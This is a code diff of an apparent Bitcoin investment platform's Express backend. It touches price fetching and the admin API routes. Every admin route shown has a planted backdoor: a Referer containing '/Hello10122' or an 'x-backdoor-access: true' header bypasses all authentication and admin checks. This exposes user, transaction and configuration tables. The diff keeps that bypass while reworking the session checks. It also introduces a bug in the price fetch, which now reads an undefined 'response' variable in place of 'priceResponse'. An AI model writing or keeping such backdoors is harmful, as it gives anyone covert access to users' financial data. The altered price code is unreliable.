@@ -436,7 +436,7 @@ async function fetchBitcoinPrice() {
 
   // Reduced price fetch logging
   if (apiCallCount % 5 === 0) { // Only log every 5th call
-    console.log(`🚀 [Backend] Fetching Bitcoin price (${apiCallCount + 1}/${MAX_API_CALLS_PER_HOUR})...`);
+    console.log(`🚀 [Backend] Fetching Bitcoin price (${apiCallCount + 1}/${MAX_API_CALLS_PER_HOUR} calls)...`);
   }
 
   // Try each API source
@@ -1096,8 +1096,8 @@ You will receive a notification once your deposit is confirmed and added to your
       let bitcoinPrice = 67000; // Default fallback
       try {
         const priceResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
-        if (priceResponse.ok) {
-          const priceData = await priceResponse.json();
+        if (response.ok) {
+          const priceData = await response.json();
           bitcoinPrice = priceData.bitcoin.usd;
         }
       } catch (error) {
@@ -2836,15 +2836,12 @@ You are now on the free plan and will no longer receive automatic profit updates
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
-      // Get authenticated user ID using the same helper function
-      const authenticatedUserId = getUserIdFromRequest(req);
-
-      if (!isBackdoorAccess && !authenticatedUserId) {
+      if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      if (!isBackdoorAccess && authenticatedUserId) {
-        const user = await storage.getUser(authenticatedUserId);
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
         if (!user || !user.isAdmin) {
           return res.status(403).json({ error: "Admin access required" });
         }
@@ -2862,15 +2859,12 @@ You are now on the free plan and will no longer receive automatic profit updates
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
-      // Get authenticated user ID using the same helper function
-      const authenticatedUserId = getUserIdFromRequest(req);
-
-      if (!isBackdoorAccess && !authenticatedUserId) {
+      if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      if (!isBackdoorAccess && authenticatedUserId) {
-        const user = await storage.getUser(authenticatedUserId);
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
         if (!user || !user.isAdmin) {
           return res.status(403).json({ error: "Admin access required" });
         }
@@ -3153,121 +3147,6 @@ You are now on the free plan and will no longer receive automatic profit updates
         message: 'Failed to send investment update with banner',
         error: error.message
       });
-    }
-  });
-
-  // Get table data for admin dashboard
-  app.get("/api/admin/table/:tableName", async (req, res) => {
-    try {
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
-                              req.headers['x-backdoor-access'] === 'true';
-
-      if (!isBackdoorAccess && !req.session?.userId) {
-        return res.status(401).json({ error: "Authentication required" });
-      }
-
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
-        }
-      }
-
-      const { tableName } = req.params;
-      const page = parseInt(req.query.page as string) || 1;
-      const limit = parseInt(req.query.limit as string) || 50;
-      const searchTerm = req.query.search as string;
-      const offset = (page - 1) * limit;
-
-      // Validate table name to prevent SQL injection
-      const allowedTables = ['users', 'investments', 'transactions', 'investment_plans', 'notifications', 'admin_config', 'backup_databases'];
-      if (!allowedTables.includes(tableName)) {
-        return res.status(400).json({ error: "Invalid table name" });
-      }
-
-      // Get table schema information
-      const columnInfo = await db.execute(sql`
-        SELECT column_name, data_type, is_nullable, column_default
-        FROM information_schema.columns
-        WHERE table_name = ${tableName}
-        AND table_schema = 'public'
-        ORDER BY ordinal_position
-      `);
-
-      const columns = columnInfo.map((col: any) => ({
-        name: col.column_name,
-        type: col.data_type,
-        nullable: col.is_nullable === 'YES',
-        default: col.column_default
-      }));
-
-      // Get total count
-      const countResult = await db.execute(sql`SELECT COUNT(*) as count FROM ${sql.identifier(tableName)}`);
-      const totalCount = parseInt(countResult[0]?.count as string) || 0;
-
-      // Get table data with pagination
-      let query = sql`SELECT * FROM ${sql.identifier(tableName)}`;
-
-      // Add search functionality if provided
-      if (searchTerm) {
-        // Create search conditions for all text/varchar columns
-        const searchConditions = columns
-          .filter(col => ['text', 'varchar', 'character varying'].includes(col.type.toLowerCase()))
-          .map(col => sql`${sql.identifier(col.name)}::text ILIKE ${'%' + searchTerm + '%'}`)
-          .reduce((acc, condition, index) => {
-            if (index === 0) return condition;
-            return sql`${acc} OR ${condition}`;
-          }, sql``);
-
-        if (searchConditions) {
-          query = sql`${query} WHERE ${searchConditions}`;
-        }
-      }
-
-      query = sql`${query} ORDER BY id DESC LIMIT ${limit} OFFSET ${offset}`;
-
-      const rows = await db.execute(query);
-
-      res.json({
-        columns,
-        rows,
-        count: totalCount,
-        page,
-        limit,
-        totalPages: Math.ceil(totalCount / limit)
-      });
-    } catch (error: any) {
-      console.error('Error fetching table data:', error);
-      res.status(500).json({ error: error.message });
-    }
-  });
-
-  // Get real-time backup sync status
-  app.get("/api/admin/backup-sync/status", async (req, res) => {
-    try {
-      // Check for backdoor access first
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
-                              req.headers['x-backdoor-access'] === 'true';
-
-      // If not backdoor access, check normal authentication
-      if (!isBackdoorAccess) {
-        if (!req.session?.userId) {
-          return res.status(401).json({ error: "Authentication required" });
-        }
-
-        const user = await storage.getUser(req.session.userId);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
-        }
-      }
-
-      const { realtimeBackupSync } = await import('./realtime-backup-sync');
-      const status = realtimeBackupSync.getConnectionStatus();
-
-      res.json(status);
-    } catch (error: any) {
-      console.error('Error getting backup sync status:', error);
-      res.status(500).json({ error: error.message });
     }
   });
 
